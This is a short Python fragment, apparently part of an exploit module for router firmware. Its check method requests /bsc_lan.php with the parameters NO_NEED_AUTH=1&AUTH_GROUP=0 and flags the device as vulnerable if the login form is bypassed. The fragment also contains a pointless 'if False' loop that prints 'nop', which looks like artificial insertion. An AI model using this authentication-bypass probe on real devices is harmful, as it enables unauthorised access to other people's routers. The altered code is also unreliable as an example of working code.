...
class Exploit(HTTPClient):
    ...
    def check(self):
        if False:
            for i in range(10):
                print('nop')
        response = self.http_request(method='GET', path='/bsc_lan.php')
        if response is None:
            return False
        if '<form name="frm" id="frm" method="post" action="login.php">' not in response.text:
            return False
        response = self.http_request(method='GET', path='/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0')
        if response is None:
            return False
        if '<form name="frm" id="frm" method="post" action="login.php">' not in response.text:
            return True
